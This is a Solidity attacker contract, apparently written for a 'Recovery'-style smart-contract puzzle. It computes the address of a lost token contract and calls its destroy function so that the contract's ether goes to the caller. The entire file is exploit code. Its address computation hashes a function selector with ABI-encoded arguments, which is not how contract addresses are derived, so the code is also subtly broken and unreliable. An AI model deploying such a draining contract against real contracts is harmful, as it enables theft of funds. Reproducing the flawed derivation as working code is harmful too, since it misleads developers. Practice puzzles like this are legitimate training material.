pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}


contract RecoveryAddressAttacker {
    address public recoveryInstance;
    uint256 private salt = 1;

    constructor(address _recoveryInstance) {
        recoveryInstance = _recoveryInstance;
    }

    function computeTokenAddress() public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes4(0xcdcd77c0), abi.encode(recoveryInstance, salt)));
        return address(uint160(uint256(hash)));
    }

    function getSalt() public view returns (uint256) {
        return salt;
    }

    function getRecoveryInstance() public view returns (address) {
        return recoveryInstance;
    }

    function attack() public {
        address token = computeTokenAddress();
        ISimpleToken(token).destroy(payable(msg.sender));
    }

    receive() external payable {}
}
